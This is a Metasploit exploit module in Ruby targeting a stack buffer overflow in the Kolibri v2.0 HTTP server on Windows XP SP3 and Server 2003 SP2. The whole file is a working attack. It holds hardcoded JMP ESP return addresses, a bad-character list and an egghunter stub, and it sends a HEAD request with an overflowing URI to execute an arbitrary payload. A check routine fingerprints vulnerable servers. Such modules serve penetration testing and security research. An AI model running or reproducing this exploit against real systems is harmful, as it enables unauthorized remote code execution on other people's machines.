##
# $Id: kolibri_http.rb 10887 2011-08-03 12:19:19Z mr_me $

##
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	HttpFingerprint = { :pattern => [ /kolibri-2\.0/ ] }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Kolibri <= v2.0 HTTP Server HEAD Buffer Overflow',
			'Description'    => %q{This exploits a stack buffer overflow in version 2 of the Kolibri HTTP server.},
			'Author'         => 
					[ 
						'mr_me <steventhomasseeley@gmail.com>', # msf
						'TheLeader' # original exploit
					],
			'Version'        => '$Revision: 10887 $',
			'References'     =>
				[
					[ 'CVE', '2002-2268' ],
					[ 'OSVDB', '70808' ],
					[ 'BID', '6289' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/15834/' ],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'       => 3000,
					'DisableNops' => true,
					'BadChars'    => "\x00\x0d\x0a\x3d\x20\x3f",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP sp3', { 'Ret' => 0x7E429353 } ] ,
					[ 'Windows Server 2003 sp2', { 'Ret' => 0x76F73BC3 } ] ,
				],
			'DisclosureDate' => 'Dec 26 2010',
			'DefaultTarget'  => 0))
	end

	def check
		info = http_fingerprint
		if info and (info =~ /kolibri-2\.0/)
			return Exploit::CheckCode::Vulnerable
		end
		Exploit::CheckCode::Safe
	end

	def exploit
		#7E429353    FFE4            JMP     ESP
		# For a reliable and large payload, we use an egg hunter
		# and direct RET to execute code
		print_status("Sending request...")
		eh_stub, eh_egg = generate_egghunter(payload.encoded, payload_badchars)
		sploit = Rex::Text.rand_text_alphanumeric(515) + [target.ret].pack('V')
		sploit << eh_stub
		send_request_raw({
			'uri'     => "/" + sploit,
			'version' => '1.1',
			'method'  => 'HEAD',
			'headers' => {'Content-Type' => eh_egg},
		})

		handler
	end

end
